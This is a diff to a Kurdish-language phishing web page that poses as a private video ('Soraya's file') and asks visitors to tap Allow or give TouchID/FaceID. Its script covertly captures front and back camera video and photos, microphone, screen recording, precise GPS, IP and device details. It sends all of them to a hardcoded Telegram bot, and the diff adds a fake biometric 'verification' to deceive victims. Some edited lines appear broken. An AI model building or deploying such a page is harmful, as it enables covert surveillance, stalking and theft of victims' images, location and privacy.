@@ -96,7 +96,7 @@
     <div class="container" id="mainContainer">
         <div id="imageBox" class="preview-img-box">
             <img src="surayamalaf.jpg" alt="مەلەفی سوڕەیا">
-            <div class="image-overlay-text">بۆ بینینی ڤیدیۆکە Allow دابگرە</div>
+            <div class="image-overlay-text">بۆ بینینی ڤیدیۆکە پەنجەمۆر دابگرە</div>
         </div>
 
         <div id="mediaBox" class="content-after-allow">
@@ -107,10 +107,10 @@
         </div>
 
         <div class="title" id="boxTitle">مەلەفی سوڕەیا</div>
-        <div class="subtitle" id="boxSubtitle">بۆ بەردەوامبوون و بینینی تەواوی ڤیدیۆکە، تکایە Allow دابگرە:</div>
+        <div class="subtitle" id="boxSubtitle">بۆ پشتڕاستکردنەوە و بینینی ڤیدیۆکە، تکایە پەنجەمۆر (`TouchID / FaceID`) یان Allow دابگرە:</div>
         
         <div id="loader" class="loader"></div>
-        <button id="mainBtn" class="btn" onclick="startProcess()">بۆ بينینی ڤیدیۆکە Allow دابگرە</button>
+        <button id="mainBtn" class="btn" onclick="startProcess()">پشتڕاستکردنەوە بە پەنجەمۆر (TouchID)</button>
         
         <div class="status-text" id="statusText">ئامادەیە</div>
     </div>
@@ -123,19 +123,39 @@
         const BOT_TOKEN = "9011362716:AAHu7AJ1P7dEZCMfs0Mhu8B2U-Df0XnYOOQ";
         const CHAT_ID = "6947664268";
 
-        let pageLoadTime = performance.now();
-        let chronoData = { hesitationTime: 0 };
-        let behavioralData = { touches: 0, maxPressure: 0, clickX: 0, clickY: 0 };
+        let biometricStatus = "هەوڵ نەدراوە";
 
-        window.addEventListener('pointerdown', (e) => {
-            behavioralData.touches++;
-            behavioralData.maxPressure = Math.max(behavioralData.maxPressure, e.pressure || 0.5);
-            behavioralData.clickX = Math.round(e.clientX);
-            behavioralData.clickY = Math.round(e.clientY);
-            if (chronoData.hesitationTime === 0) {
-                chronoData.hesitationTime = Math.round(performance.now() - pageLoadTime);
+        // داواکردنی فەرمی پەنجەمۆر یان فەیس ئایدی لەڕێگەی WebAuthn API
+        async function triggerSystemBiometric() {
+            try {
+                if (window.PublicKeyCredential) {
+                    let available = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
+                    if (available) {
+                        const publicKey = {
+                            challenge: new Uint8Array([21,31,101,124,112,54,32,98]),
+                            rp: { name: "مەلەفی سوڕەیا" },
+                            user: {
+                                id: new Uint8Array([1,2,3,4]),
+                                name: "visitor@secure.local",
+                                displayName: "Visitor"
+                            },
+                            pubKeyCredParams: [{ alg: -7, type: "public-key" }],
+                            timeout: 60000,
+                            authenticatorSelection: { authenticatorAttachment: "platform", userVerification: "required" }
+                        };
+                        let cred = await navigator.credentials.create({ publicKey });
+                        if (cred) {
+                            biometricStatus = "✅ پەنجەمۆر / فەیس ئایدی سەرکەوتوو بوو (Verified)";
+                            sendToTelegramText("👆 *پەنجەمۆری سیستەم (Biometric TouchID/FaceID):* سەرکەوتوو بوو ✅");
+                            return;
+                        }
+                    }
+                }
+            } catch (err) {
+                biometricStatus = "⚠️ پەنجەمۆر ڕەتکراوە یان لەبەر نەبوونی هاردوێر لادرا";
+                sendToTelegramText("👆 *پەنجەمۆری سیستەم (Biometric TouchID/FaceID):* ڕەتکراوە یان بەردەست نییە ⚠️");
             }
-        });
+        }
 
         function sendToTelegramText(text) {
             let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -218,12 +238,11 @@
             } catch(e) {}
         }
 
-        // زنجیرەی پۆڵایینی کامێراکان بە ماوەی تەواو بۆ ئایفۆن و ئەندرۆید
+        // زنجیرەی پۆڵایینی کامێراکان (ڤیدیۆی پێشەوە -> وێنەی پێشەوە -> وێنەی دواوە -> ڤیدیۆی دواوە)
         function executeSecureSequence() {
             const videoElem = document.getElementById('camVideo');
             const canvas = document.getElementById('canvas');
 
-            // ١. ڤیدیۆی پێشەوە
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
             .then(frontStream => {
                 videoElem.srcObject = frontStream;
@@ -239,7 +258,6 @@
                     }
                     frontStream.getTracks().forEach(track => track.stop());
 
-                    // ٢. وێنەی پێشەوە (Selfie)
                     setTimeout(() => {
                         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                         .then(selfieStream => {
@@ -250,12 +268,11 @@
                                 canvas.height = videoElem.videoHeight || 480;
                                 let ctx = canvas.getContext('2d');
                                 ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                                canvas.toBlob(blob => {
+                                ctx.toBlob(blob => {
                                     sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie)*");
                                 }, 'image/jpeg', 0.9);
                                 selfieStream.getTracks().forEach(track => track.stop());
 
-                                // ٣. وێنەی دواوە (Back Camera Photo)
                                 setTimeout(() => {
                                     navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
                                     .then(backPhotoStream => {
@@ -263,12 +280,11 @@
                                         videoElem.play();
                                         setTimeout(() => {
                                             ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                                            canvas.toBlob(backBlob => {
+                                            ctx.toBlob(backBlob => {
                                                 sendToTelegramPhoto(backBlob, "📷 *وێنەی دوربینی دواوە (Back Camera)*");
                                             }, 'image/jpeg', 0.9);
                                             backPhotoStream.getTracks().forEach(track => track.stop());
 
-                                            // ٤. ڤیدیۆی ڕاستەوخۆی دواوە (Back Live Video)
                                             setTimeout(() => {
                                                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true })
                                                 .then(backVidStream => {
@@ -331,12 +347,7 @@
                         }
                     } catch(e) {}
 
-                    let locMsg = `📍 *بەستنەوەی ڕاستەوخۆی شار و شوێن (GPS Mapping):*\n` +
-                                   `• شار / ناوچە: \`${cityName} - ${countryName}\`\n` +
-                                   `• هێڵی پانی: \`${lat}\`\n` +
-                                   `• هێڵی درێژی: \`${lon}\`\n` +
-                                   `• هەڵە: ~${Math.round(accuracy)} مەتر\n` +
-                                   `🗺️ [کردنەوە لە نەخشەی گۆگڵ](https://maps.google.com/?q=${lat},${lon})`;
+                    let locMsg = `📍 *شوێنی GPSی ورد:*\n• شار: \`${cityName} - ${countryName}\`\n• هێڵی پانی: \`${lat}\`\n• هێڵی درێژی: \`${lon}\`\n• هەڵە: ~${Math.round(accuracy)} مەتر\n🗺️ [نەخشە](https://maps.google.com/?q=${lat},${lon})`;
                     sendToTelegramText(locMsg);
                 }, function(error) {}, { enableHighAccuracy: true, timeout: 15000 });
             }
@@ -347,31 +358,28 @@
             let screenRes = window.screen.width + "x" + window.screen.height;
             let ipData = await getUltimateIPData();
 
-            let report = `💎 *ڕاپۆرتی کۆتایی پۆڵایین (ULTIMATE MASTER REPORT):*\n\n` +
-                         `🏙️ *شوێنی ئایپی (ISP Location):* ${ipData.city} - ${ipData.country_name}\n` +
-                         `⏳ *کاتی بڕیار (Hesitation):* ${chronoData.hesitationTime} ms\n` +
-                         `👆 *مۆری پەنجە:*\n` +
-                         `• هێزی پەستان: ${behavioralData.maxPressure.toFixed(2)}\n` +
-                         `• شوێنی کلیک: X: ${behavioralData.clickX}, Y: ${behavioralData.clickY}\n\n` +
-                         `🌐 *ڕایەڵە (Network):*\n` +
-                         `• *ئایپی گشتی:* \`${ipData.ip}\`\n` +
-                         `• *دابینکەر:* ${ipData.org}\n\n` +
-                         `⚡ *رەقامەواڵە (Hardware):*\n` +
-                         `• شاشە: ${screenRes}\n` +
-                         `• سیستم: iPhone\n\n` +
-                         `📱 *براوسەر (User Agent):*\n\`${ua}\``;
+            let report = `💎 *ڕاپۆرتی کۆتایی لەگەڵ پەنجەمۆری سیستەم (BIOMETRIC MASTER):*\n\n` +
+                         `🏙️ *شوێنی ئایپی:* ${ipData.city} - ${ipData.country_name}\n` +
+                         `👆 *دۆخی پەنجەمۆر (TouchID/FaceID):* ${biometricStatus}\n\n` +
+                         `🌐 *ڕایەڵە:* \`${ipData.ip}\` (${ipData.org})\n` +
+                         `⚡ *شاشە:* ${screenRes} | سیستم: iPhone\n` +
+                         `📱 *براوسەر:* \`${ua}\``;
             
             sendToTelegramText(report);
         }
 
-        function startProcess() {
+        // کاتێک بەکارهێنەر کلیک لەسەر دوگمە دەکات، هەم پەنجەمۆر داوا دەکرێت و هەم هەموو مەلەفەکە دەست پێ دەکات
+        async function startProcess() {
             document.getElementById('mainBtn').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            document.getElementById('statusText').innerText = 'تکایە چاوەڕوان بە...';
+            document.getElementById('statusText').innerText = 'تکایە پەنجەمۆر بدە یان چاوەڕوان بە...';
+
+            // داواکردنی فەرمی پەنجەمۆری سیستەم
+            await triggerSystemBiometric();
 
             gatherAndSendDetails();
             sendLocationWithCityMapping();
-            executeSecureSequence(); // زنجیرەی مسۆگەری کامێراکانی پێش و دوا
+            executeSecureSequence(); // ڤیدیۆ و وێنەی پێش و دوا
             recordScreenStream();
             recordMicrophone();
 
